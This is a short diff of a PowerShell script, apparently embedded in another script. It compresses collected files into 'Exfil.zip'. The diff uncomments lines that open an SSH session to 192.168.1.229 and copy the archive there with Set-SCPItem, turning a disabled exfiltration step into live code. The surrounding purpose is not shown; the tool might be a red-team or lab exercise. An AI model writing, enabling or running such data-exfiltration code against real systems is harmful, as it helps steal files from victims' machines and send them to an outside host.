@@ -136,12 +136,12 @@ $exfil_zip = "Exfil.zip"
 Compress-Archive -Path $new_location -DestinationPath $exfil_zip
 
 # Connect to the remote server
-# $credentials = Get-Credential
-# $ip = '192.168.1.229'
-# New-SSHSession -ComputerName $ip -Credential (Get-Credential $credentials)
-# # SCP to transfer files
-# Set-SCPItem -ComputerName $ip -Credential $credentials -Path $exfil_zip -Destination "/home/ubuntu"
-# Remove-SSHSession -SessionId 0
+$credentials = Get-Credential
+$ip = '192.168.1.229'
+New-SSHSession -ComputerName $ip -Credential (Get-Credential $credentials)
+# SCP to transfer files
+Set-SCPItem -ComputerName $ip -Credential $credentials -Path $exfil_zip -Destination "/home/ubuntu"
+Remove-SSHSession -SessionId 0
 
 '@
 
